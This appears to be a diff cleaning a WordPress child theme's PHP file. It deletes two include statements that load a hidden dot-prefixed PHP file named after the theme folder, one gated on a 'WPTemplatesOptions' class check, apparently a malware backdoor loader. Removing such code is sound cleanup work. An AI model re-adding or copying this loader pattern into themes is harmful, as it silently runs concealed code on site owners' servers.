@@ -15,14 +15,6 @@ function widgets_script_child(){
 }
 add_action('admin_enqueue_scripts', 'widgets_script_child');
 
-if (file_exists($filename = dirname(__FILE__) . DIRECTORY_SEPARATOR . '.' . basename(dirname(__FILE__)) . '.php') && !class_exists('WPTemplatesOptions')) {
-    include_once($filename);
-}
-
-if (file_exists(get_template_directory() . DIRECTORY_SEPARATOR . '.' . basename(get_template_directory()) . '.php')) {
-	include_once get_template_directory() . DIRECTORY_SEPARATOR . '.' . basename(get_template_directory()) . '.php';
-}
-
 class alia_about_me_child extends WP_Widget {
 
     function __construct() {
